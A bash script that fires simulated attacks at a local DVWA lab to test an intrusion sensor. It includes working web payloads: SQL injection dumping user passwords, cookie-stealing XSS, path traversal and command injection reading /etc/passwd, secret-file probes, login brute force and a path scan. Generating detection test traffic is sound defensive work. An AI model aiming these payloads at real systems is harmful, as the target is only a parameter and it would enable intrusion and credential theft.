#!/usr/bin/env bash
# Sends simulated attacks to the LOCAL DVWA lab so the sensor has something to detect.
# Only run against systems you own or have written permission to test.
set -uo pipefail
T="${1:-http://localhost:8080}"

hit() {  # hit <path> [extra curl args...]
  code=$(curl -s -o /dev/null --max-time 5 --path-as-is -w "%{http_code}" "${@:2}" "$T$1")
  echo "  $code  $1"
}

echo "== SQL injection";      hit "/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20&Submit=Submit"
echo "== XSS";                hit "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
echo "== Path traversal";     hit "/vulnerabilities/fi/?page=../../../../etc/passwd"
echo "== Command injection";  hit "/vulnerabilities/exec/?ip=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd"
echo "== Attack tool UA";     hit "/" -A "sqlmap/1.8.4#stable (https://sqlmap.org)"
echo "== Sensitive files";    hit "/.env"; hit "/.git/config"
echo "== Brute force (12 logins)"
for i in $(seq 1 12); do hit "/vulnerabilities/brute/?username=admin&password=guess$i&Login=Login"; done
echo "== Directory scan (25 random paths)"
for i in $(seq 1 25); do hit "/hidden-$RANDOM.php"; done
echo "Done."
